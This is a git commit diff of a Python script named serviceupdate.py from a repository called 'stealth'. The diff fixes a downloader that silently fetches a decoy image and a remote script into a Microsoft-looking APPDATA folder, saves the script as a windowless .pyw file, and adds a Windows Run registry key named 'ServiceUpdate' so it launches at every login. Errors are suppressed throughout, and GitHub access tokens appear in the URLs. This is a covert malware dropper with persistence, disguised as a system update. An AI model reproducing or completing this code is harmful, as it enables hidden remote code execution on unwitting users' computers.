784871f4e228612ec8f4275e1fd38cd9130f6d40
Kimon270270 <kimonpanditchhetri@gmail.com>
2025-05-17 11:59:02 -0400

    service update -- typo fixed, SetValueEx argument added. download and update registry working, but run_load needs testing

--- serviceupdate.py
+++ serviceupdate.py
@@ -3,7 +3,8 @@ import requests
 import os
 
 
-target_path = os.path.join()
+target_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "MyAppliactions")
+os.makedirs(target_path, exist_ok=True)
 image_path = os.path.join(target_path, "DOG.png")
 code_path = os.path.join(target_path,"load.pyw")
 
@@ -11,26 +12,25 @@ code_path = os.path.join(target_path,"load.pyw")
 def download():
     try:
         if not (os.path.exists(image_path)):
-            dog_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/DOG.png?token=GHSAT0AAAAAADDU7VJLRDLXPUQCUEZM3UPO2BGKMMA"
+            dog_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/DOG.png?token=GHSAT0AAAAAADD5ISUSXPATLA6DAQF6TMHI2BIWF5Q"
             dog_response = requests.get(dog_url)
             
             try:
                 if dog_response.status_code == 200:
                     with open (image_path, "wb") as f:
-                        f.write(dog_response.content)        
+                        f.write(dog_response.content)  
             except:
                 pass 
                         
                         
         if not (os.path.exists(code_path)):
-            code_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/load.py?token=GHSAT0AAAAAADDU7VJLCEAE4XWT3XRDAN7M2BGST4A"
+            code_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/load.py?token=GHSAT0AAAAAADD5ISUTJBDLRW2JYIU5YRMG2BIWEOA"
             code_response = requests.get(code_url)
             
             try:
                 if code_response.status_code == 200:
                     with open (code_path, "wb") as f:
-                        print(2)
-                        f.write(code_response.content)        
+                        f.write(code_response.content)    
             except:
                 pass                       
     except:
@@ -38,8 +38,8 @@ def download():
     
 def update_registry():
      
-     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Miscrosoft\Windows\CurrentVersion\Run", 0 , winreg.KEY_SET_VALUE) as key:
-         winreg.SetValueEx(key, "ServiceUpdate", winreg.REG_SZ, f'"{code_path}"')
+     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , winreg.KEY_ALL_ACCESS) as key:
+         winreg.SetValueEx(key, "ServiceUpdate", 0, winreg.REG_SZ, f'"pythonw.exe""{code_path}"')
     
     
 def run_load():
